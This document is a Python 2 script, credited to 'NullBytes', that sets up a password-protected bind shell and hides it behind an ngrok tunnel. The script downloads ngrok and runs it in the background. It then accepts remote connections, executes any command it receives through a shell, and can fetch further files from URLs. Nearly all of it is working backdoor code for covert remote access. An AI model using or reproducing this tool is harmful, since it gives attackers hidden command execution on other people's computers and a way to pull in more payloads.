#!/usr/bin/python
""""" Bind shell code is  from NullBytes"""
import zipfile
import socket, os, thread, subprocess, urllib2
from os import system
from wget import download
from ConfigParser import SafeConfigParser
from readconf import *
global port, username, password, auth, download_status

proto = "tcp"
cfgfile = readconf()
ostype = systemos().lower()
config = SafeConfigParser()
config.read(cfgfile)
download_status = config.get('Download', 'downloads')
port = config.get('Bind', 'port')
auth = config.get('Bind', 'ngauth')
username = config.get('Bind', 'user')
password = config.get('Bind', 'password')


def extractWin(filename):
    ngrok_zip = zipfile.ZipFile(filename)
    path = tmpdir
    ngrok_zip.extractall(path)
    ngrok_zip.close()
    os.remove(filename)


def Ngrok_Download(ostype):

    filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
    url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
    download(url)

    if ostype == 'windows':
        extractWin(filename)
    else:
        system('unzip ' + filename)
        system('mv ngrok ' + tmpdir)
        system('rm -Rf ' + filename)
        system('clear')



def Ngauth(command, auth):
#    subprocess.Popen([command, 'authtoken', auth], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    os.popen(command+' authtoken '+auth)

def launchTunnelWithoutConsole(command, port):
    """Launches 'command' windowless and waits until finished"""
#    startupinfo = subprocess.STARTUPINFO()
#    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
#    startupinfo.wShowWindow = subprocess.SW_HIDE
#    subprocess.Popen([command, 'tcp', port], startupinfo=startupinfo)
    if ostype == 'windows':
        os.popen2('START /B '+command+' tcp '+port)

    else:
        os.popen2(command+' tcp '+port + ' &')


def runNgRok(ostype, auth, port):
    if ostype == 'windows':
        Ngauth(tmpdir+'\\ngrok.exe', auth)
        launchTunnelWithoutConsole(tmpdir+'\\ngrok.exe', str(port))

    elif ostype == 'linux':
        Ngauth(tmpdir+'/ngrok', auth)
        launchTunnelWithoutConsole(tmpdir+'/ngrok', str(port))

    elif ostype == 'darwin':
        Ngauth(tmpdir + '/ngrok', auth)
        launchTunnelWithoutConsole(tmpdir + '/ngrok', str(port))
    else:
        print("Un-supported Platform")
        exit(0)


if __name__ == "__main__":

    if (download_status) == 'True':
        Ngrok_Download(ostype)
        runNgRok(ostype, auth, port)

    else:
        runNgRok(ostype, auth, port)


def connection(conn):
        conn.setblocking(1)
        conn.send("USER: ")
        user = conn.recv(1024)
        conn.send("PASS: ")
        passwd = conn.recv(1024)

        if user.strip('\r\n') == str(username) and passwd.strip('\r\n') == str(password):
            conn.send('Connection Established!')
            while True:
                conn.send('\n$')
                data = conn.recv(1024)

                if data.strip('\r\n') == 'quit' or data.strip('\r\n') == 'exit':
                    conn.close()
                    break

                elif data.strip('\r\n').startswith('cd'):
                    try:
                        os.chdir(data.strip('\r\n')[3:])
                    except:
                        conn.send('The system path cannot be found!')

                elif data.strip('\r\n').startswith('wget'):
                    try:
                        f = open(os.path.basename(data[5:]), "wb")
                        f.write(urllib2.urlopen(data[5:]))
                        f.close()
                        conn.send("Successfully downloaded %s" % os.path.basename(data[5:]))
                    except:
                        conn.send("Download failed!")

                else:
                    proc = subprocess.Popen(data.strip('\r\n'), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdoutput = proc.stdout.read() + proc.stderr.read()
                    conn.send(stdoutput)

        else:
            conn.send("Incorrect user/pass combination!\n")
            conn.close()

while True:
    try:

        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', int(port)))
        s.listen(5)
        print(port)
        while True:
            s.settimeout(2)
            try:
                conn, addr = s.accept()

            except socket.timeout:
                continue

            if (conn):
                s.settimeout(None)
                thread.start_new_thread(connection, (conn,))

    except:
        pass


